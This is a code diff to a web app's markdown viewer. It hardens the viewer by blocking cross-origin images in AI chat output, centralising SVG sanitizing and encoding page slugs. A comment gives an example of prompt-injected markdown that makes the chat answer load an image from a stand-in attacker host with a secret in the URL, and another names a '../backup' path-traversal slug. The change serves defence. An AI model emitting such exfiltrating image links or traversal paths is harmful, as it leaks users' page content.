@@ -5,6 +5,7 @@ import DOMPurify from 'dompurify'
 import 'katex/dist/katex.min.css'
 import { escapeHtml, renderMarkdown } from '../../lib/markdown'
 import { ensureMermaid } from '../../lib/mermaidBootstrap'
+import { sanitizeDiagramSvg } from '../../lib/diagramSvg'
 import api from '../../api/client'
 
 // Single DOMPurify config shared between the top-level sanitize and the
@@ -49,6 +50,30 @@ function sanitizeMarkdownHtml(dirty) {
   return DOMPurify.sanitize(dirty, MARKDOWN_SANITIZE_CONFIG)
 }
 
+// Replace every cross-origin <img> with a plain-text marker. Used where the
+// markdown comes from somewhere an attacker can steer, such as LLM output in
+// the AI chat: an image loads automatically, so a prompt-injected
+// `![](https://evil.example/?d=<secret>)` would otherwise leak page content
+// the moment the answer renders. Same-origin media (/api/media/...) is kept.
+function stripExternalImages(html, label) {
+  const tpl = document.createElement('template')
+  tpl.innerHTML = html
+  tpl.content.querySelectorAll('img').forEach((img) => {
+    let url
+    try {
+      url = new URL(img.getAttribute('src') || '', window.location.href)
+    } catch {
+      url = null
+    }
+    if (url && url.origin === window.location.origin) return
+    const span = document.createElement('span')
+    span.className = 'external-image-blocked'
+    span.textContent = label(img.getAttribute('alt') || url?.hostname || '')
+    img.replaceWith(span)
+  })
+  return tpl.innerHTML
+}
+
 // Stable default so non-publicMode callers don't retrigger effects every render.
 const EMPTY_DIAGRAMS = Object.freeze({})
 
@@ -64,11 +89,16 @@ export default function MarkdownViewer({
   publicMode = false,
   diagrams = EMPTY_DIAGRAMS,
   onHeadings,
+  allowExternalImages = true,
 }) {
-  const html = useMemo(() => sanitizeMarkdownHtml(renderMarkdown(content || '')), [content])
-  const containerRef = useRef(null)
   const navigate = useNavigate()
   const { t } = useTranslation()
+  const html = useMemo(() => {
+    const safe = sanitizeMarkdownHtml(renderMarkdown(content || ''))
+    if (allowExternalImages) return safe
+    return stripExternalImages(safe, (name) => t('chat.externalImageBlocked', { name }))
+  }, [content, allowExternalImages, t])
+  const containerRef = useRef(null)
   const [lightboxSvg, setLightboxSvg] = useState(null)
   const [lightboxImg, setLightboxImg] = useState(null)
 
@@ -207,11 +237,7 @@ export default function MarkdownViewer({
         } else {
           const svgEl = diagram.querySelector('.drawio-svg')
           if (svgEl) {
-            setLightboxSvg(
-              DOMPurify.sanitize(svgEl.innerHTML, {
-                USE_PROFILES: { svg: true, svgFilters: true },
-              }),
-            )
+            setLightboxSvg(sanitizeDiagramSvg(svgEl.innerHTML))
           }
         }
       }
@@ -257,9 +283,7 @@ export default function MarkdownViewer({
         const id = el.dataset.diagramId
         const svg = diagrams[id]
         if (svg) {
-          const safeSvg = DOMPurify.sanitize(svg, {
-            USE_PROFILES: { svg: true, svgFilters: true },
-          })
+          const safeSvg = sanitizeDiagramSvg(svg)
           el.innerHTML = `<div class="drawio-svg">${safeSvg}</div>`
           el.classList.add('drawio-clickable')
         } else {
@@ -274,9 +298,7 @@ export default function MarkdownViewer({
       try {
         const res = await api.get(`/diagrams/${id}`)
         if (res.data.svg_cache) {
-          const safeSvg = DOMPurify.sanitize(res.data.svg_cache, {
-            USE_PROFILES: { svg: true, svgFilters: true },
-          })
+          const safeSvg = sanitizeDiagramSvg(res.data.svg_cache)
           el.innerHTML = `<div class="drawio-svg">${safeSvg}</div>`
           el.classList.add('drawio-clickable')
         } else {
@@ -334,7 +356,9 @@ export default function MarkdownViewer({
         }
 
         try {
-          const res = await api.get(`/pages/${slug}`)
+          // Encode: the slug is author-controlled, and an unencoded `../backup`
+          // would make every viewer's browser call another API endpoint.
+          const res = await api.get(`/pages/${encodeURIComponent(slug)}`)
           el.innerHTML = sanitizeMarkdownHtml(renderMarkdown(res.data.content_md || ''))
           const nextVisited = new Set(visited).add(slug)
           await loadTransclusionsIn(el, depth + 1, nextVisited)
